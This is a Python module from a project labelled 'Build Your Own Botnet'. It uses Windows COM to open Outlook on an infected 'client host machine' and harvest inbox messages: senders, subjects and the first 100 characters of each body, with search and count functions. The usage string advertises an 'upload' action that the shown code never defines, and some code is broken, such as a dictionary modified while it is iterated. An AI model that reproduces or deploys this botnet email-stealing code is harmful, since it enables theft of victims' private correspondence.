#!/usr/bin/python
# -*- coding: utf-8 -*-
'Outlook Email (Build Your Own Botnet)'

# standard library
import sys
import time
import json
import threading

# packages
if sys.platform == 'win32':
    import pythoncom
    import win32com.client

# utilities
import util

# globals
packages = ['win32com.client','pythoncom']
platforms = ['win32']
results = {}
usage = 'outlook <get/count/search/upload>'
description = """
Interact with the Outlook email client application on the client host machine
"""

# main
def _get_emails():
    pythoncom.CoInitialize()
    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
    inbox   = outlook.GetDefaultFolder(6)
    unread  = inbox.Items
    while True:
        email = None
        try:
            email = unread.GetNext()
        except:
            break
        if email:
            sender   = email.SenderEmailAddress.encode('ascii','ignore')
            message  = email.Body.encode('ascii','ignore')[:100] + '...'
            subject  = email.Subject.encode('ascii','ignore')
            received = str(email.ReceivedTime).replace('/','-').replace('\\','')
            globals()['results'][received] = {'from': sender, 'subject': subject, 'message': message}
        else:
            break

def installed():
    """
    Check if Outlook is installed on the host machine
    """
    try:
        pythoncom.CoInitialize()
        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
        return True
    except:
        return False

def search(s):
    """
    Search the emails in the Outlook inbox
    """
    pythoncom.CoInitialize()
    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
    inbox   = outlook.GetDefaultFolder(6)
    emails  = util.emails(inbox.Items)
    for k,v in emails.items():
        if s not in v.get('message') and s not in v.get('subject') and s not in v.get('from'):
            emails.pop(k,v)
    return json.dumps(emails, indent=2)

def count():
    """
    Count unread emails in Outlook inbox
    """
    if len(globals()['results']):
        result = len(globals()['results'])
    else:
        pythoncom.CoInitialize()
        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
        inbox = outlook.GetDefaultFolder(6)
        result = len(inbox.Items)
    return "Emails in Outlook inbox: {}".format(result)

def run():
    """
    Run the Outlook email module

    """
    t = threading.Thread(target=_get_emails, name=time.time())
    t.setDaemon(True)
    t.run()
    return t
